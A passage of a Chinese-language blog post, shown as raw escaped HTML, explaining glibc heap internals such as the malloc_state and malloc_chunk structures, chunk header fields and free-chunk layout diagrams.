SIZE_SZ &amp;amp; MALLOC_ALIGN_MASK];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125; heap_info;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;malloc_stateу╗ЊТъёСйЊ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#malloc_stateу╗ЊТъёСйЊ&#34;&gt;#&lt;/a&gt; malloc_state у╗ЊТъёСйЊ№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	Т»ЈСИфу║┐уеІтЈфТюЅСИђСИф arena header№╝їжЄїжЮбС┐ЮтГўС║є binсђЂtop chunk уГЅС┐АТЂ»сђѓСИ╗у║┐уеІуџё main_arena &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3huLS1saWJjLXA2NmZpMDBibmxoLnNv&#34;&gt;С┐ЮтГўтюе libc.so&lt;/span&gt; уџёТЋ░ТЇ«Т«хжЄї№╝їтЁХС╗ќу║┐уеІуџё arena тѕЎС┐ЮтГўтюеу╗ЎУ»Ц arena тѕєжЁЇуџё heap жЄїжЮбсђѓmalloc_state т«џС╣ЅтдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;malloc_state&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Serialize access.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;mutex_t&lt;/span&gt; mutex;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Flags (formerly in max_fast).  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; flags;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Fastbins */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mfastbinptr fastbinsY[NFASTBINS];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Base of the topmost chunk -- not otherwise kept in a bin */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mchunkptr top;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* The remainder from the most recent split of a small request */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mchunkptr last_remainder;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Normal bins packed as described above */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mchunkptr bins[NBINS * &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Bitmap of bins */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; binmap[BINMAPSIZE];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Linked list */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;malloc_state&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;next&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Linked list for free arenas.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;malloc_state&lt;/span&gt; *&lt;span class=&#34;title&#34;&gt;next_free&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Memory allocated from the system in this arena.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  INTERNAL_SIZE_T system_mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  INTERNAL_SIZE_T max_system_mem;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;malloc_chunkу╗ЊТъёСйЊ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#malloc_chunkу╗ЊТъёСйЊ&#34;&gt;#&lt;/a&gt; malloc_chunk у╗ЊТъёСйЊ№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	chunk Тў» glibc у«АуљєтєЁтГўуџётЪ║ТюгтЇЋСйЇ№╝їТЋ┤СИфтаєтюетѕЮтДІтїќтљјС╝џУбФтйЊТѕљСИђСИф free  chunk№╝їуД░С╣ІСИ║ top chunk №╝їТ»ЈТгАућеТѕиУ»иТ▒ѓтєЁтГўТЌХ№╝їтдѓТъю bins СИГТ▓АТюЅтљѕжђѓуџё chunk №╝їmalloc т░▒С╝џС╗ј top chunk СИГУ┐ЏУАїтѕњтѕє№╝їтдѓТъю top chunk уџётцДт░ЈСИЇтцЪ№╝їтѕЎУ░Ѓуће brk () ТЅЕт▒ЋтаєуџётцДт░Ј№╝їуёХтљјС╗јТќ░ућЪТѕљуџё top chunk СИГУ┐ЏУАїтѕЄтѕєсђѓућеТѕижЄіТћЙтєЁтГўТЌХ№╝їglibc С╝џтЁѕТа╣ТЇ«ТЃЁтєхт░єжЄіТћЙуџё chunk СИјтЁХС╗ќуЏИжѓ╗уџё free chunk тљѕт╣Х№╝їуёХтљјтіатЁЦтљѕжђѓуџё bin СИГсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	СИІтЏЙт▒Ћуц║С║єтаєтЮЌућ│У»итњїжЄіТћЙуџёУ┐ЄуеІсђѓждќтЁѕ№╝їућеТѕиУ┐ъу╗Гућ│У»иС║єСИЅСИфтаєтЮЌ AсђЂBсђЂC№╝їТГцТЌХжЄіТћЙ chunk B №╝їућ▒С║јт«ЃСИј top chunk СИЇуЏИжѓ╗№╝їТЅђС╗ЦС╝џУбФТћЙтЁЦ bin СИГ№╝їТѕљСИ║СИђСИф free chunkсђѓуј░тюетєЇТгАућ│У»иСИђСИфСИј B уЏИтљїтцДт░ЈуџётаєтЮЌ№╝їтѕЎ malloc т░єС╗ј bin СИГтЈќтЄ║ chunk B №╝їтЏътѕ░СИђт╝ђтДІуџёуіХТђЂ№╝їbin уџёУАетц┤С╣ЪС╝џТїЄтљЉ nullсђѓсђѓСйєтдѓТъюућеТѕиУ┐ъу╗ГжЄіТћЙ chunk A тњї chunk B №╝їућ▒С║јС╗ќС╗гуЏИжѓ╗СИћжЃйТў» free chunk №╝їжѓБС╣ѕт░▒С╝џУбФтљѕт╣ХТѕљСИђСИфтцДуџё chunk ТћЙтЁЦ bin СИГсђѓ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://img-blog.csdnimg.cn/direct/01387fb92db746dc8ec05b89342e1ee2.png#pic_center&#34; alt=&#34;тюеУ┐ЎжЄїТЈњтЁЦтЏЙуЅЄТЈЈУ┐░&#34;&gt;&lt;/p&gt;
&lt;p&gt;РђІ	т»╣С╗ЦСИіуЪЦУ»єТюЅС║єу«ђтЇЋуџётЇ░У▒АС╣Ітљј№╝їт░▒тЈ»С╗ЦуюІуюІ chunk уџёС┐АТЂ»Тў»ТђјС╣ѕУбФ glibc У«░тйЋуџё№╝їСИІжЮбТў» malloc chunk уџёу╗ЊТъёСйЊт«џС╣Ѕ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;malloc_chunk&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  INTERNAL_SIZE_T      prev_size;  &lt;span class=&#34;comment&#34;&gt;/* Size of previous chunk (if free).  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  INTERNAL_SIZE_T      size;       &lt;span class=&#34;comment&#34;&gt;/* Size in bytes, including overhead. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;malloc_chunk&lt;/span&gt;* &lt;span class=&#34;title&#34;&gt;fd&lt;/span&gt;;&lt;/span&gt;         &lt;span class=&#34;comment&#34;&gt;/* double links -- used only if free. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;malloc_chunk&lt;/span&gt;* &lt;span class=&#34;title&#34;&gt;bk&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Only used for large blocks: pointer to next larger size.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;malloc_chunk&lt;/span&gt;* &lt;span class=&#34;title&#34;&gt;fd_nextsize&lt;/span&gt;;&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;/* double links -- used only if free. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;malloc_chunk&lt;/span&gt;* &lt;span class=&#34;title&#34;&gt;bk_nextsize&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тюеж╗ўУ«цТЃЁтєхСИІ№╝їINTERNAL_SIZE_T уџётцДт░Јтюе 64 СйЇу│╗у╗ЪСИІТў» 8 тГЌУіѓ№╝ї32 СйЇу│╗у╗ЪСИІТў» 4 тГЌУіѓсђѓС╗ЦСИІТў»тЁ│С║ј malloc_chunk уџётљёСИфТѕљтЉўуџётіЪУЃй№╝џ&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;prev_size&lt;/strong&gt;, тдѓТъюУ»Ц chunk уџё ** уЅЕуљєуЏИжѓ╗уџётЅЇСИђтю░тЮђ chunk№╝ѕСИцСИфТїЄжњѕуџётю░тЮђти«тђ╝СИ║тЅЇСИђ chunk тцДт░Ј№╝Ѕ** Тў»уЕ║жЌ▓уџёУ»Ю№╝їжѓБУ»ЦтГЌТ«хУ«░тйЋуџёТў»тЅЇСИђСИф chunk уџётцДт░Ј (тїЁТІг chunk тц┤)сђѓтљдтѕЎ№╝їУ»ЦтГЌТ«хтЈ»С╗ЦућеТЮЦтГўтѓеуЅЕуљєуЏИжѓ╗уџётЅЇСИђСИф chunk уџёТЋ░ТЇ«сђѓ&lt;strong&gt;У┐ЎжЄїуџётЅЇСИђ chunk ТїЄуџёТў»УЙЃСйјтю░тЮђуџё chunk&lt;/strong&gt; сђѓ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;size&lt;/p&gt;
&lt;p&gt;№╝їУ»Ц chunk уџётцДт░Ј№╝їтцДт░Јт┐ЁжА╗Тў» 2 * SIZE_SZ уџёТЋ┤ТЋ░тђЇсђѓтдѓТъюућ│У»иуџётєЁтГўтцДт░ЈСИЇТў» 2 * SIZE_SZ уџёТЋ┤ТЋ░тђЇ№╝їС╝џУбФУйгТЇбТ╗АУХ│тцДт░ЈуџёТюђт░Јуџё 2 * SIZE_SZ уџётђЇТЋ░сђѓ32 СйЇу│╗у╗ЪСИГ№╝їSIZE_SZ Тў» 4№╝Џ64 СйЇу│╗у╗ЪСИГ№╝їSIZE_SZ Тў» 8сђѓ У»ЦтГЌТ«хуџёСйјСИЅСИфТ»ћуЅ╣СйЇт»╣ chunk уџётцДт░ЈТ▓АТюЅтй▒тЊЇ№╝їт«ЃС╗гС╗јжФўтѕ░СйјтѕєтѕФУАеуц║&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;NON_MAIN_ARENA№╝їУ«░тйЋтйЊтЅЇ chunk Тў»тљдСИЇт▒ъС║јСИ╗у║┐уеІ№╝ї1 УАеуц║СИЇт▒ъС║ј№╝ї0 УАеуц║т▒ъС║јсђѓ&lt;/li&gt;
&lt;li&gt;IS_MAPPED№╝їУ«░тйЋтйЊтЅЇ chunk Тў»тљдТў»ућ▒ mmap тѕєжЁЇуџёсђѓ&lt;/li&gt;
&lt;li&gt;PREV_INUSE№╝їУ«░тйЋтЅЇСИђСИф chunk тЮЌТў»тљдУбФтѕєжЁЇсђѓСИђУѕгТЮЦУ»┤№╝їтаєСИГуггСИђСИфУбФтѕєжЁЇуџётєЁтГўтЮЌуџё size тГЌТ«хуџё P СйЇжЃйС╝џУбФУ«Йуй«СИ║ 1№╝їС╗ЦСЙ┐С║јжў▓ТГбУ«┐жЌ«тЅЇжЮбуџёжЮъТ│ЋтєЁтГўсђѓтйЊСИђСИф chunk уџё size уџё P СйЇСИ║ 0 ТЌХ№╝їТѕЉС╗гУЃйжђџУ┐Є prev_size тГЌТ«хТЮЦУјитЈќСИіСИђСИф chunk уџётцДт░ЈС╗ЦтЈітю░тЮђсђѓУ┐ЎС╣ЪТќ╣СЙ┐У┐ЏУАїуЕ║жЌ▓ chunk С╣ІжЌ┤уџётљѕт╣Хсђѓ&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fd№╝їbk&lt;/p&gt;
&lt;p&gt;сђѓ chunk тцёС║јтѕєжЁЇуіХТђЂТЌХ№╝їС╗ј fd тГЌТ«хт╝ђтДІТў»ућеТѕиуџёТЋ░ТЇ«сђѓchunk уЕ║жЌ▓ТЌХ№╝їС╝џУбФТи╗тіатѕ░т»╣т║ћуџёуЕ║жЌ▓у«АуљєжЊЙУАеСИГ№╝їтЁХтГЌТ«хуџётљФС╣ЅтдѓСИІ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fd ТїЄтљЉСИІСИђСИф№╝ѕжЮъуЅЕуљєуЏИжѓ╗№╝ЅуЕ║жЌ▓уџё chunk&lt;/li&gt;
&lt;li&gt;bk ТїЄтљЉСИіСИђСИф№╝ѕжЮъуЅЕуљєуЏИжѓ╗№╝ЅуЕ║жЌ▓уџё chunk&lt;/li&gt;
&lt;li&gt;жђџУ┐Є fd тњї bk тЈ»С╗Цт░єуЕ║жЌ▓уџё chunk тЮЌтіатЁЦтѕ░уЕ║жЌ▓уџё chunk тЮЌжЊЙУАеУ┐ЏУАїу╗ЪСИђу«Ауљє&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;fd_nextsize№╝ї bk_nextsize&lt;/p&gt;
&lt;p&gt;№╝їС╣ЪТў»тЈфТюЅ chunk уЕ║жЌ▓уџёТЌХтђЎТЅЇСй┐уће№╝їСИЇУ┐ЄтЁХућеС║јУЙЃтцДуџё chunk№╝ѕlarge chunk№╝Ѕсђѓ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;fd_nextsize ТїЄтљЉтЅЇСИђСИфСИјтйЊтЅЇ chunk тцДт░ЈСИЇтљїуџёуггСИђСИфуЕ║жЌ▓тЮЌ№╝їСИЇтїЁтљФ bin уџётц┤ТїЄжњѕсђѓ&lt;/li&gt;
&lt;li&gt;bk_nextsize ТїЄтљЉтљјСИђСИфСИјтйЊтЅЇ chunk тцДт░ЈСИЇтљїуџёуггСИђСИфуЕ║жЌ▓тЮЌ№╝їСИЇтїЁтљФ bin уџётц┤ТїЄжњѕсђѓ&lt;/li&gt;
&lt;li&gt;СИђУѕгуЕ║жЌ▓уџё large chunk тюе fd уџёжЂЇтјєжА║т║ЈСИГ№╝їТїЅуЁДућ▒тцДтѕ░т░ЈуџёжА║т║ЈТјњтѕЌсђѓ&lt;strong&gt;У┐ЎТаитЂџтЈ»С╗ЦжЂ┐тЁЇтюет»╗ТЅЙтљѕжђѓ chunk ТЌХТїеСИфжЂЇтјєсђѓ&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;РђІ	СИђСИфти▓у╗ЈтѕєжЁЇуџё chunk уџёТаитГљтдѓСИІсђѓ&lt;strong&gt;ТѕЉС╗гуД░тЅЇСИцСИфтГЌТ«хуД░СИ║ chunk header№╝їтљјжЮбуџёжЃетѕєуД░СИ║ user dataсђѓТ»ЈТгА malloc ућ│У»итЙЌтѕ░уџётєЁтГўТїЄжњѕ№╝їтЁХт«ъТїЄтљЉ user data уџёУхитДІтцё№╝їС╣Ът░▒Тў» mem тцёуџётю░тЮђсђѓ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;РђІ	тйЊСИђСИф chunk тцёС║јСй┐ућеуіХТђЂТЌХ№╝їт«ЃуџёСИІСИђСИф chunk уџё prev_size тЪЪТЌаТЋѕ№╝їТЅђС╗ЦСИІСИђСИф chunk уџёУ»ЦжЃетѕєС╣ЪтЈ»С╗ЦУбФтйЊтЅЇ chunk Сй┐ућесђѓ&lt;strong&gt;У┐Ўт░▒Тў» chunk СИГуџёуЕ║жЌ┤тцЇућесђѓ&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chunk-&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        |             Size of previous chunk, &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;unallocated&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(P clear)&lt;/span&gt;  |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        |             Size of chunk, in bytes                     |A|M|P|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mem-&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        |             User data starts here...                          .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        .                                                               .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        .             &lt;span class=&#34;params&#34;&gt;(malloc_usable_size() bytes)&lt;/span&gt;                      .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;next    .                                                               |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chunk-&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        |             &lt;span class=&#34;params&#34;&gt;(size of chunk, but used &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; application data)&lt;/span&gt;    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        |             Size of next chunk, in bytes                |A|0|1|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	УбФжЄіТћЙуџё chunk УбФУ«░тйЋтюежЊЙУАеСИГ№╝ѕтЈ»УЃйТў»тЙфуј»тЈїтљЉжЊЙУАе№╝їС╣ЪтЈ»УЃйТў»тЇЋтљЉжЊЙУАе№╝ЅсђѓтЁиСйЊу╗ЊТъётдѓСИІ:&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chunk-&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        |             Size of previous chunk, &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;unallocated&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(P clear)&lt;/span&gt;  |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;`head:&amp;#x27; |             Size of chunk, in bytes                     |A|0|P|&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mem-&amp;gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&lt;/span&gt;&lt;br&gt;&lt;span 